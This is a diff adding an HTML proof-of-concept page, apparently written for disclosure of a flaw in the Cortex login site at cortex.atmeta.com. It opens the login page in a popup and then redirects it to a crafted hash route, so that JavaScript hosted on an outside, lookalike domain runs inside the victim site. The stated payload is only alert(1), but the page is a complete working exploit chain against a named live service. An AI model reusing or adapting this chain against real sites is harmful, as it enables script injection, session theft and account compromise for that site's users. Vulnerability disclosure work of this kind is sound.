@@ -1,0 +1,18 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Cortex GitHub external-JS proof</title>
+<style>body{max-width:760px;margin:60px auto;font:18px/1.5 system-ui,sans-serif;padding:0 20px}button{font:inherit;padding:12px 18px}code{overflow-wrap:anywhere}</style>
+<h1>Cortex GitHub external-JS proof</h1>
+<p>This harmless proof opens the public Cortex login page, waits for it to load, then triggers the vulnerable hash route. The injected script is served from <code>nayssers.github.io</code> and only displays <code>alert(1)</code> plus a fixed DOM marker.</p>
+<button id="run">Run proof</button>
+<p id="status">Ready.</p>
+<script>
+const clean='https://cortex.atmeta.com/CS.aspx?VP3=LoginRegistration&L=True&R=False';
+const chain=clean+'#/https://cortex.atmeta.co/meta-cors-poc/partial/';
+document.getElementById('run').onclick=()=>{
+  const victim=window.open(clean,'cortex_github_external_js');
+  if(!victim){document.getElementById('status').textContent='Popup blocked. Allow popups and retry.';return;}
+  document.getElementById('status').textContent='Cortex opened. Triggering in 6 seconds…';
+  setTimeout(()=>{victim.location=chain;document.getElementById('status').textContent='Triggered. Cortex should show alert(1), then title CORTEX_GITHUB_EXTERNAL_JS_CONFIRMED.';},6000);
+};
+</script>
